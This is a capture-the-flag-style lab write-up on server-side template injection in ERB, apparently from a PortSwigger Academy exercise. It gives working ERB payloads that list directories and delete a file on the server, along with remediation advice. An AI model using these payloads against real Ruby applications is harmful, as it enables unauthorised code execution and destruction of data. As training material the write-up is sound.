# Lab: Basic Server-Side Template Injection (ERB)
- Date: 2024-01-22
- Platform: PortSwigger Academy
- Difficulty: Practitioner
- Vulnerability: Server-Side Template Injection (SSTI) in ERB Template

## Lab Description
    This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template. The goal is to exploit the vulnerability to execute arbitrary code and delete the morale.txt file from Carlos's home directory.

## Key Steps
- Vulnerability Identification: Discovered SSTI vulnerability in the message parameter
- Template Engine Detection: Identified ERB (Embedded Ruby) as the template engine
- Directory Enumeration: Used ERB syntax to explore the filesystem structure
- File Deletion: Located and deleted the target file using Ruby file operations

## Vulnerable Endpoint
```GET /?message=Unfortunately this product is out of stock```

## Exploitation Payloads

    Directory enumeration
    ```
        <%= Dir.entries('/') %>                    # List root directory
        <%= Dir.entries('/home') %>                # List home directory  
        <%= Dir.entries('/home/carlos') %>         # List Carlos's directory
    ```

    File deletion
        ```<%= File.delete('/home/carlos/morale.txt') %>  # Delete target file```

## Attack Flow

1. Input Validation → ERB Template Injection → Ruby Code Execution
2. Filesystem Exploration → Target File Location → File Deletion

## Vulnerability Details
- Unsafe Template Construction: User input directly interpolated into ERB template
- Lack of Input Sanitization: No validation of template syntax in message parameter
- Ruby Code Execution: ERB <%= %> tags allow arbitrary Ruby code execution

## ERB-Specific Exploitation
- Syntax: <%= Ruby code %> for execution and output
- File Operations: Used Ruby's File.delete() and Dir.entries() methods
- Path Traversal: Direct filesystem access through Ruby classes

## Lesson Learned
- Never directly interpolate user input into templates
- Implement strict input validation for template syntax
- Use context-aware output encoding
- Restrict template engine capabilities in production
- ERB templates can execute arbitrary Ruby code if not properly secured

## Remediation
- Use template context-aware escaping
- Implement whitelist-based input validation
- Sandbox template execution environments
- Avoid direct user input in template construction

# Real-World Impact: 
```ERB SSTI vulnerabilities can lead to remote code execution, sensitive data exposure, and complete server compromise in Ruby web applications.```